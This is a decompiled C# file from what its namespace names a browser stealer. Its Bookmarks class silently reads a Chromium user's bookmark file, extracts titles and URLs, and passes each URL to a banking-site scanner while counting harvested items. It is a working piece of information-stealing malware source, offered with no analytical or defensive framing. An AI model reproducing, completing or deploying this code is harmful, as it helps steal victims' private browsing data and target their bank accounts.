using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Stealer.Chromium
{
	// Token: 0x02000022 RID: 34
	internal sealed class Bookmarks
	{
		// Token: 0x0600009E RID: 158 RVA: 0x00006A74 File Offset: 0x00004C74
		public static List<Bookmark> Get(string sBookmarks)
		{
			List<Bookmark> list2;
			try
			{
				List<Bookmark> list = new List<Bookmark>();
				bool flag = !File.Exists(sBookmarks);
				if (flag)
				{
					list2 = list;
				}
				else
				{
					string text = File.ReadAllText(sBookmarks, Encoding.UTF8);
					text = Regex.Split(text, "      \"bookmark_bar\": {")[1];
					text = Regex.Split(text, "      \"other\": {")[0];
					string[] array = Regex.Split(text, "},");
					foreach (string text2 in array)
					{
						bool flag2 = text2.Contains("\"name\": \"") && text2.Contains("\"type\": \"url\",") && text2.Contains("\"url\": \"http");
						if (flag2)
						{
							int num = 0;
							string[] array3 = Regex.Split(text2, Parser.separator);
							int j = 0;
							while (j < array3.Length)
							{
								string text3 = array3[j];
								num++;
								Bookmark bookmark = default(Bookmark);
								bool flag3 = Parser.DetectTitle(text3);
								if (flag3)
								{
									bookmark.sTitle = Parser.Get(text2, num);
									bookmark.sUrl = Parser.Get(text2, num + 2);
									bool flag4 = string.IsNullOrEmpty(bookmark.sTitle);
									if (!flag4)
									{
										bool flag5 = !string.IsNullOrEmpty(bookmark.sUrl) && !bookmark.sUrl.Contains("Failed to parse url");
										if (flag5)
										{
											Banking.ScanData(bookmark.sUrl);
											Counter.Bookmarks++;
											list.Add(bookmark);
										}
									}
								}
								IL_018F:
								j++;
								continue;
								goto IL_018F;
							}
						}
					}
					list2 = list;
				}
			}
			catch
			{
				list2 = new List<Bookmark>();
			}
			return list2;
		}
	}
}
